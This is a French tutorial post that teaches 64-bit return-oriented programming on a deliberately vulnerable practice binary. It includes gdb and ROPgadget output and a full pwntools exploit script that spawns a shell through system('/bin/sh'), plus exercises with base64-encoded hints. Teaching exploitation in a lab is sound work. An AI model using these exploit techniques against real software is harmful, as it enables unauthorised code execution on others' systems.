---
title: Partie 21 - Exploiter un binaire par ROP - construction de chaînes de gadgets (2/6)
date: 2026-04-18 10:00:00
categories: [Pwn, Introduction au pwn]
tags: [x86, pwn, linux]     # TAG names should always be lowercase
author: kabeche
toc: true
---

# Exploiter un binaire par ROP : construction de chaînes de gadgets (2/6)

## Après la théorie, la pratique

> Lors de la résolution de l'exercice ci-dessous, il se peut que vous ayez des **valeurs ou adresses différentes**. N'hésitez pas à **adapter les valeurs** dans les scripts ou commandes en fonction de ce que vous obtenez sur votre machine.
{: .prompt-warning }

### Contrôler `rip`

Plutôt que de se lancer directement sur des binaires très complexes, et si on commençait par un exercice simple pour apprendre concrètement à faire du **ROP** ?

Voici le programme que nous allons tenter d'exploiter :

```cpp
#define _GNU_SOURCE     
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>

int main()
{
    void (*leak)(int) = dlsym(RTLD_NEXT, "puts");
    printf("Un petit leak car tu m'as l'air bien sympa : %p\n",leak);

    char buffer[0x10] = {0};

    read(0,buffer,0x100);

    printf("Salut %s",buffer);

    return 0;
}
```

Pour la compilation `gcc -no-pie -fno-pie -fno-stack-protector main.c -o exe` :

- PIE est désactivé ;
- pas de canaris ;
- compilé en 64 bits.

Pour rappel, l'**ASLR** est évidemment **activée**.

Accès au conteneur Docker :

- ⬇️ **Téléchargement** : [pwn-rop-exo-1.zip](https://drive.proton.me/urls/XNZT0509FC#wM9U34SCMOPk)
- 🔎 **SHA256 & Analyse Virus Total** : [9a06351355aa0176c74fccbe7eeb450d9209732461724f807fa0d28fb5a5f4d0](https://www.virustotal.com/gui/file/9a06351355aa0176c74fccbe7eeb450d9209732461724f807fa0d28fb5a5f4d0)
- ⚙️ **Construction et lancement du conteneur** :

```sh
docker build -t pwn-rop-exo-1 .

docker run -it --rm -p 1234:1234 --cap-add=SYS_PTRACE --security-opt seccomp=unconfined pwn-rop-exo-1
```

Le programme fait **fuiter l'adresse** de la fonction `puts` de la **libc** avant de **lire des données** dans `buffer`. Allons directement à la première étape : contrôler `rip`. En effet, sans contrôle du pointeur d'instruction, nous n'irons pas bien loin ...

Ce n'est pas le premier dépassement de mémoire que l'on rencontre, autant apprendre de nouvelles choses. Utilisons le module `cyclic` de **pwntools** afin de déterminer à partir de quel *offset* dans notre entrée nous contrôlons effectivement `rip`. Pour cela, vous pouvez utiliser **IPython** dans un autre terminal et exécuter les instructions suivantes :

```python
from pwn import *

g = cyclic_gen(n=8) # n=8 octets --> car RIP est sur 64 bits
print(g.get(256))
# exemple :
b'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaab'
```

> Nous utilisons seulement 256 caractères car c'est le maximum que le programme puisse lire.
{: .prompt-tip }

Ensuite, il suffit de lancer le programme dans **gdb** avec l'entrée précédemment générée et noter la valeur de `rip` lorsque le programme plantera. Pour le lancer :

```
run < <(echo 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaab')
```

Le programme plante comme prévu avec la valeur suivante dans `rip` :

```
$rcx: 0x0000000000000000
$rdx: 0x0000000000000000
$rsp: 0x00007fffffffe1b0  ->  0x6161616161616167
$rbp: 0x6161616161616165 ('eaaaaaaa'?)
$rsi: 0x1090626161616161
$rdi: 0x00007fffffffdfa0  ->  0x00007fffffffdfd0  ->  0x1090626161616161
$rip: 0x6161616161616166 ('faaaaaaa'?)
```

Il suffit ensuite de basculer vers le terminal **IPython** et lancer : 

```python
cyclic_find(b'faaaaaaa',n=8)
40
```

Le résultat `40` signifie que la séquence `b'faaaaaaa'` commence à l’octet **40** du motif cyclique généré (indexation en octets). Cela signifie qu'en envoyant d'abord 40 octets, les 8 prochains octets **constitueront le contenu de** `rip` lors du retour de la fonction.  

Commençons par écrire un petit script que l'on complétera au fur et à mesure que nous avançons dans l'exploitation :

```python
from pwn import *

io = process("./exe")

payload = b"A"*40 # Bourrage
payload += p64(0xdeadbeefcafebabe)

io.send(payload)

io.interactive()
```

Vous pouvez vérifier dans **gdb**, la valeur de `rip` lorsque le programme plante est bien `0xdeadbeefcafebabe`.

### Construction de la chaîne de ROP

A présent que nous contrôlons `rip` ainsi que les premiers éléments sur la pile, nous pouvons **construire notre chaîne de ROP**. Avant de lancer **ROPgadget**, prenons un instant pour définir un **objectif clair**.

Que diriez-vous d'exécuter `system("/bin/sh")` ? En 32 bits nous aurions pu le faire avec un **ret2libc** mais en 64 bits nous n'avons pas d'autre choix que de construire une chaîne de ROP. Nous avons principalement **deux étapes** à réaliser :

1. récupérer l'adresse de `system` : comme l'**ASLR** est activée et que la **libc** est **PIE**, il va falloir trouver un moyen de faire **fuiter une adresse** de la **libc**. Bonne nouvelle : le programme s'en charge déjà pour nous 🤝 ;
2. écrire `"/bin/sh"` en mémoire à défaut d'avoir un pointeur vers cette *string*.

Le fait d'avoir un *leak* de la **libc** nous offre en réalité bien plus que la possibilité de récupérer l'adresse de `system`. Cela nous permet aussi d'utiliser les gadgets présents dans la libc, eux aussi sont **soumis à l'ASLR car la libc est chargée dynamiquement (PIC)**.

Je ne sais pas si vous avez lancé **ROPgadget** sur le programme, mais, comment dire... il n'y a pas tellement de gadgets intéressants. Nous allons certainement devoir **utiliser ceux de la libc**.

#### 🤝 `/bin/sh` dans la libc, merci pour les travaux

Nous allons aussi profiter du *leak* pour nous faciliter la vie. Pour ne pas avoir à écrire `/bin/sh` en mémoire, nous pouvons au moins essayer de voir si cette chaîne de caractères n'est pas **déjà présente dans la mémoire de la libc** à une **adresse prévisible** (relativement à l'adresse de base, une fois que nous aurons notre *leak*). 

Voici comment utiliser **pwntools** afin de chercher un offset pointant vers `"/bin/sh\x00"` :

```python
from pwn import *

libc = ELF("/CHEMIN_VERS/libc.so.6")
print(hex(next(libc.search(b'/bin/sh\x00'))))
# Ex :
# 0x1cb42f
```

> Vous pouvez utiliser `ldd ./exe` pour trouver le chemin vers la **libc** utilisée par le programme.
{: .prompt-tip }

Super, nous avons trouvé un offset vers `"/bin/sh\x00"` ! Une fois que l'on aura trouvé **l'adresse de base de la libc**, nous pourrons calculer l'adresse exacte de `"/bin/sh\x00"`.

#### 🔎 Trouver des gadgets pour charger des registres

A ce stade, nous avons une stratégie pour :

- trouver l'adresse de `system` ;
- trouver un pointeur vers `"/bin/sh"`.

C'est super mais nous n'avons pas encore trouvé de gadget pour charger les paramètres via les registres, en l'occurrence `rdi`. Etant donné que nous contrôlons les premiers éléments de la pile, le gadget qui nous aiderait beaucoup serait un gadget du type `pop rdi ; ret` de telle sorte à ce que l'adresse de `"/bin/sh"` soit en tête de pile au moment de l'exécution du gadget.

En exécutant `ROPgadget --binary ./exe | grep 'pop rdi'`, aucun résultat n'est trouvé 🥲. Essayons avec la **libc** alors ?

```
$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep 'pop rdi'

0x000000000017b045 : pop rdi ; pop rbp ; jmp rcx
0x000000000002a873 : pop rdi ; pop rbp ; ret
0x0000000000158778 : pop rdi ; pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x000000000010f78b : pop rdi ; ret
0x000000000014f08d : pop rdi ; ret 0xffee
0x0000000000126295 : pop rdi ; retf
0x00000000000fd98a : pop rdi ; sbb byte ptr [rax - 0x3f], cl ; jmp 0xfd9a6
0x000000000016e9ef : pop rdi ; sbb byte ptr [rax - 0x75], cl ; jnp 0x16e9fd ; call 0x283e0
0x000000000013ae0b : pop rdi ; sub byte ptr [rax + 0xf], cl ; ror dword ptr [rax - 0x7d], 1 ; ret 0x4180
0x0000000000180f70 : pop rdi ; xor ebx, ebx ; jmp 0x180f9e
0x0000000000156fdf : pop rsi ; pop rdi ; jmp 0x156e92
0x0000000000172486 : push rsi ; pop rdi ; jmp 0x172489
0x0000000000192173 : ror byte ptr [rax - 0x7d], 0xef ; pop rdi ; add rax, rdi ; jmp 0x192071
0x0000000000193a43 : ror byte ptr [rax - 0x7d], 0xef ; pop rdi ; add rax, rdi ; jmp 0x1938e2
```

Voilà qui est mieux 😎 ! Vu que l'on a le choix, autant choisir le gadget qui nous permet ni plus ni moins de faire ce que l'on veut :

```
$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep 'pop rdi ; ret'

0x000000000014f08b : add al, ch ; pop rdi ; ret 0xffee
0x000000000016bc0b : out 0xe8, al ; pop rdi ; retf
0x000000000010f78b : pop rdi ; ret    <-------
0x000000000014f08d : pop rdi ; ret 0xffee
0x0000000000126295 : pop rdi ; retf
```

Celui à l'adresse `0x000000000010f78b` semble être ce que l'on cherche. Notons son *offset*, nous en aurons besoin plus tard.

> Lorsque des **gadgets intéressants** s'offrent à nous, il convient de faire attention à certaines choses. Tout d'abord, il vaut mieux sélectionner celui qui permet de réaliser **l'action attendue** (charger un registre, échanger la valeur entre deux registres ...) **ni plus ni moins** pour éviter de faire planter le programme avec des instructions superflues qui **engendreraient des effets de bord**.
> 
> Egalement, lorsqu'il est possible de choisir entre **plusieurs mêmes gadgets** qui ont des *offsets* différents, parfois en prendre un **aléatoirement** suffit. Dans d'autres cas, il faudra peut-être faire attention à la **valeur de l'offset**. Peut-être que le programme s'attend à ce que l'adresse soit un nombre pair ? Ou aligné sur 16 octets ?
{: .prompt-tip }

> On aurait fait comment s'il n'y avait pas le gadget que l'on cherche ?
{: .prompt-info }

Dans un tel cas, il faut généralement se débrouiller pour faire autrement. Par "faire autrement" on entend, par exemple, jeter un oeil au contenu de chaque registre. Peut-être que l'un des registres contient une adresse intéressante. Par exemple, si `rbx` pointe vers l'adresse de la variable `buffer` en mémoire, on pourrait chercher des gadgets du style `mov rdi, rbx`.

N'hésitez pas non plus à jeter un œil au code désassemblé, parfois on y trouve des choses que **ROPgadget** lui-même n'a pas su trouver 😉.

> Dans la recherche de gadgets, on cherche très souvent à éviter ceux qui se terminent par un `leave ; ret`. Cela revient à exécuter `mov rsp, rbp ; pop rbp ; ret`. De ce fait, **l'adresse de la pile est modifiée** et toute la chaîne de ROP dans *buffer* ne sert plus à rien ...
> 
> Il y a toutefois un cas où un `leave ; ret` peut être **très précieux** et permettre de sortir de situations où la taille de l'entrée utilisateur est si petite que l'on ne peut pas aller bien loin. La technique en question s'appelle un **pivot de stack**. Nous aurons l'occasion d'en reparler plus tard.
{: .prompt-warning }

#### 🔗 L'allure de la chaîne de ROP

Normalement, si tout se passe bien, notre chaîne de ROP devrait s'exécuter de la sorte :

![](/assets/images/introduction_au_pwn/rop_exo_bis.png)

> Vous remarquerez que, de la même manière que l'**adresse** d'une fonction **précède** ses **arguments** dans la pile, dans la **chaîne de ROP** c'est pareil. On y met d'abord l'argument du gadget avant d'y mettre les éléments dont il a besoin.
> 
> Néanmoins ce n'est pas une règle absolue. Dans certains gadgets un peu plus complexes, il est possible que les éléments manipulés soient placés différemment.
{: .prompt-tip }

#### Ecriture du script de résolution de l'exercice

Et maintenant, au boulot !

La première étape va être de récupérer le *leak* :

```python
from pwn import *

io = process("./exe")

data = io.recvuntil(b"\n") 

# Recuperation du leak de "puts" sous forme d'entier
puts_leak = int(data[-15:-1],16) 
log.info(f"leak @ {hex(puts_leak)}")
```

Maintenant, à partir du leak et des *offsets* de `system` et de la chaîne de caractères `"/bin/sh"`, déterminons leurs adresses dans le processus :

```python
from pwn import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
io = process("./exe")

data = io.recvuntil(b"\n") 

# Recuperation du leak de "puts" sous forme d'entier
puts_leak = int(data[-15:-1],16) 
log.info(f"leak @ {hex(puts_leak)}")

puts_offset = libc.symbols["puts"]

# Calcul de l'adresse de base de la libc
libc.address = puts_leak - puts_offset
log.info(f"libc_base @ {hex(libc.address)}")
```

Pour rappel, l'adresse d'une fonction est égale à `addr_base + offset`. Avec un calcul digne du collège, nous pouvons en déduire **l'adresse de base de la libc**.

Cela affiche par exemple `[*] libc_base @ 0x7c0aae200000`. Si les **12 bits de poids faible** ne sont pas nuls, il se peut qu'il y ait une **erreur** dans votre calcul. 

> J'avais initialement fait fuiter l'adresse de `strlen` dans l'exercice sauf que cela ne me donnait **pas la bonne adresse** de base de la **libc**. 
> 
> Cela est dû au fait qu'il y a plusieurs symboles commençant par `strlen*`. Avec `puts` nous n'avons plus ce souci.
{: .prompt-tip }

On en déduit les adresses de `system`, `"/bin/sh"` ainsi que du gadget `pop rdi ; ret` :

```python
from pwn import *

OFFSET_POP_RDI_RET = 0x10f78b

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
io = process("./exe")

data = io.recvuntil(b"\n") 

# Recuperation du leak de "puts" sous forme d'entier
puts_leak = int(data[-15:-1],16) 
log.info(f"leak @ {hex(puts_leak)}")

puts_offset = libc.symbols["puts"]

# Calcul de l'adresse de base de la libc
libc.address = puts_leak - puts_offset
log.info(f"libc_base @ {hex(libc.address)}")


addr_system = libc.symbols["system"]
addr_bin_sh = next(libc.search(b'/bin/sh\x00'))
addr_pop_rdi_ret = libc.address + OFFSET_POP_RDI_RET

log.info(f"system @ {hex(addr_system)}")
log.info(f'"/bin/sh" @ {hex(addr_bin_sh)}')
log.info(f'pop_rdi_ret gadget @ {hex(addr_pop_rdi_ret)}')
```

> Une fois que **l'adresse de base** est saisie dans `libc.address`, toutes les valeurs récupérées via `libc.symbols["xxxx"]` seront automatiquement calculées **à partir de cette adresse**.
> 
> Par exemple : `0x79f713e87be0` au lieu de `0x87be0`.
{: .prompt-tip }

Il ne reste plus qu'à ajouter notre chaîne de ROP au payload final :

```python
from pwn import *

OFFSET_POP_RDI_RET = 0x10f78b

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
io = process("./exe")

data = io.recvuntil(b"\n") 

# Recuperation du leak de "puts" sous forme d'entier
puts_leak = int(data[-15:-1],16) 
log.info(f"leak @ {hex(puts_leak)}")

puts_offset = libc.symbols["puts"]

# Calcul de l'adresse de base de la libc
libc.address = puts_leak - puts_offset
log.info(f"libc_base @ {hex(libc.address)}")


addr_system = libc.symbols["system"]
addr_bin_sh = next(libc.search(b'/bin/sh\x00'))
addr_pop_rdi_ret = libc.address + OFFSET_POP_RDI_RET

log.info(f"system @ {hex(addr_system)}")
log.info(f'"/bin/sh" @ {hex(addr_bin_sh)}')
log.info(f'pop_rdi_ret gadget @ {hex(addr_pop_rdi_ret)}')

payload = b"A"*40 
payload += p64(addr_pop_rdi_ret)
payload += p64(addr_bin_sh)
payload += p64(addr_system)

io.send(payload)

io.interactive()
```

#### Alignement de la pile

Et en exécutant le script python ... bah ça ne marche pas 😩. En utilisant `gdb.attach(io)` avant le `io.send(payload)`, on se rend compte que le programme plante ici :

![](/assets/images/introduction_au_pwn/rop_movaps.png)

Un `SIGSEGV` a lieu lors de l'instruction `movaps` ([MOVe Aligne Packed Single](https://www.felixcloutier.com/x86/movaps)) qui nécessite que l'opérande de destination soit alignée sur 16 octets. Comme vous pouvez le constater, `rsp` n'est pas aligné sur 16 octets, donc `rsp + 0x50` non plus.

Il s'agit d'un [problème connu](https://ropemporium.com/guide.html) en **ROP 64 bits** pour certaines fonctions comme `system` ou `printf`.

Il y a plusieurs solutions envisageables mais la plus commode pour ne pas trop modifier notre chaîne de ROP est de modifier notre gadget `pop rdi ; ret` avec un gadget qui exécute deux instructions `pop` dont l'une dans `rdi`.

Le fait d'exécuter deux fois `pop` d'un registre de 8 octets permettra d'aligner *in fine* la pile sur 16 octets. Il faut évidemment que ce gadget permette toujours de charger l'adresse de `/bin/sh` dans `rdi`.

Nous pouvons utiliser `ROPgadget` avec un peu de `grep` pour trouver un tel gadget : 

```
$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep ': pop r.. ; pop r.. ; ret' | grep 'rdi'

0x000000000002a873 : pop rdi ; pop rbp ; ret
```

Un tel gadget existe, nous sommes sauvés !

> Si dans votre **libc** un tel gadget **n'existait pas**, nous aurions pu garder le gadget `pop rdi ; ret` mais il aurait fallu **ajouter un gadget** `pop rxx ; pop rxx ; ret` **dans la chaîne de ROP** pour que `rsp` soit **aligné sur 16 octets** avant d'exécuter `system`.
{: .prompt-tip }

> **Astuce** : si l'outil met beaucoup de temps à afficher les gadgets, vous pouvez sauvegarder la sortie dans un fichier texte afin de ne pas relancer l'outil à chaque fois. Un simple `cat gadgets.txt | grep ...` suffira ensuite.
{: .prompt-tip }

La **chaîne de ROP finale** aura cette allure :

![](/assets/images/introduction_au_pwn/final_rop_exo.png)

#### Script final

Cette fois-ci, promis, c'est la vraie version finale :

```python
from pwn import *

OFFSET_POP_RDI_POP_RBP_RET = 0x2a873

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
io = process("./exe")

data = io.recvuntil(b"\n") 

# Recuperation du leak de "puts" sous forme d'entier
puts_leak = int(data[-15:-1],16) 
log.info(f"leak @ {hex(puts_leak)}")

puts_offset = libc.symbols["puts"]

# Calcul de l'adresse de base de la libc
libc.address = puts_leak - puts_offset
log.info(f"libc_base @ {hex(libc.address)}")


addr_system = libc.symbols["system"]
addr_bin_sh = next(libc.search(b'/bin/sh\x00'))
addr_pop_rdi_pop_rbp_ret = libc.address + OFFSET_POP_RDI_POP_RBP_RET

log.info(f"system @ {hex(addr_system)}")
log.info(f'"/bin/sh" @ {hex(addr_bin_sh)}')
log.info(f'pop_rdi_ret gadget @ {hex(addr_pop_rdi_pop_rbp_ret)}')

# Construction de la chaine de ROP
payload = b"A"*40 
payload += p64(addr_pop_rdi_pop_rbp_ret)
payload += p64(addr_bin_sh)
payload += b"BBBBBBBB"
payload += p64(addr_system)

io.send(payload)

io.interactive()
```

Ce qui donne :

![](/assets/images/introduction_au_pwn/rop_id_bis.png)

Pas mal non 😎 ?

## S'exercer

Nous avons résolu ensemble le précédent exercice. Il est désormais temps que vous écriviez vous-même le script de résolution. Vous trouverez ci-dessous différents exercices afin de mettre davantage la main à la pâte.

Bon courage !

> Si le nombre d'octets lus dans `read(0,buffer,0x100);` est limitant ou bloquant, vous pouvez l'augmenter et recompiler le programme afin de pouvoir utiliser une chaîne de ROP plus longue.
> 
> Comme il s'agit d'exercices d'introduction on peut se permettre quelques largesses 😉.
{: .prompt-tip }

### Exercice n°1

Reprenez le précédent exercice avec la contrainte suivante :

- vous n'avez pas le droit de réutiliser la chaîne `"/bin/sh"` présente dans la libc.

Il va falloir trouver un moyen de l'écrire quelque part en mémoire ...

#### 💡 **Indice n°1**

```
TGUgcHJvZ3JhbW1lIG4nZXN0IHBhcyBQSUUsIHZvdXMgcG91dmV6IMOpY3JpcmUgw6AgdW5lIGFkcmVzc2UgY29ubnVlIGQnYXZhbmNlIGNvbW1lIGRhbnMgLmJzcyBvdSAuZGF0YS4=
```

#### 💡 **Indice n°2**

```
SWwgeSBhIHBsdXNpZXVycyBmYcOnb25zIGQnw6ljcmlyZSB1bmUgY2hhw65uZSBkZSBjYXJhY3TDqHJlcy4gUGFyIGV4ZW1wbGUsIHF1J2VzdC1jZSBxdWkgbm91cyBlbXDDqmNoZSBkJ2FwcGVsZXIgJ3JlYWQoMCxhZGRyLDgpJyA/CgpOJ291YmxpZXogcGFzIGRlIHJlbXBsaXIgZCdhYm9yZCBsZSBwcsOpY8OpZGVudCBidWZmZXIgZGUgMHgxMDAgb2N0ZXRzIGF2YW50IGQnZW52b3llciBsZXMgZG9ubsOpZXMgZHUgZGV1eGnDqG1lIGFwcGVsIMOgICdyZWFkJy4KClNpbm9uLCB2b3VzIHBvdXZleiBhdXNzaSDDqWNyaXJlICIvYmluL3NoXHgwMCIgc3VyIGxhIHBpbGUgKDggb2N0ZXRzKSBhaW5zaSBxdWUgbCdhZHJlc3NlIG/DuSB2b3VzIHNvdWhhaXRleiDDqWNyaXJlIGV0IHRyb3V2ZXIgdW4gZ2FkZ2V0IGR1IHN0eWxlIDogJ3BvcCBYWFggOyBwb3AgWVlZIDsgbW92IFtYWFhdLCBZWVkgOyAuLi4gOyByZXQnLgoKRmFpdGVzIHByZXV2ZSBkJ2ltYWdpbmF0aW9uICE=
```

#### 💡 **Indice n°3**

```
Vm91cyBkZXZyaWV6IHBvdXZvaXIgdHJvdXZlciBjZXMgZ2FkZ2V0cyBxdWksIGF2ZWMgbGUgZ2FkZ2V0ICdwb3AgcmRpIDsgcmV0JywgcGVybWV0dGVudCBkZSBjaGFyZ2VyIGxlcyAzIGFyZ3VtZW50cyBkZSAncmVhZCc6CgoweDAwMDAwMDAwMDAxMTBhN2QgOiBwb3AgcnNpIDsgcmV0CjB4MDAwMDAwMDAwMDBiNTAzYyA6IHBvcCByZHggOyB4b3IgZWF4LCBlYXggOyBwb3AgcmJ4IDsgcG9wIHIxMiA7IHBvcCByMTMgOyBwb3AgcmJwIDsgcmV0
```

### Exercice n°2

Reprenez le précédent exercice avec les contraintes suivantes :

- vous n'avez pas le droit de réutiliser la chaîne `"/bin/sh"` présente dans la libc ;
- vous devez appeler `execve("/bin/sh",["/bin/sh","-p",NULL],NULL)` au lieu de `system`. 
 
Vous pouvez rendre le programme SUID pour tester le bon fonctionnement du script de résolution. Prenez bien le temps de voir quelle allure aura la chaîne de ROP au brouillon avant de vous lancer dans l'écriture du script de résolution. 

### Exercice n°3

Reprenez le précédent exercice avec les contraintes suivantes :

- vous devez résoudre l'exercice en exécutant un appel système via un *shellcode*. 

#### 💡 **Indice n°1**

```
Vm91cyBwb3V2ZXogdXRpbGlzZXIgJ21wcm90ZWN0JyBwb3VyIGNoYW5nZXIgbGVzIHBlcm1pc3Npb25zL3Byb3RlY3Rpb25zIGQndW5lIHpvbmUgbcOpbW9pcmUgKGFsaWduw6llIHN1ciBsYSB0YWlsbGUgZCd1bmUgcGFnZSBtw6ltb2lyZSku
```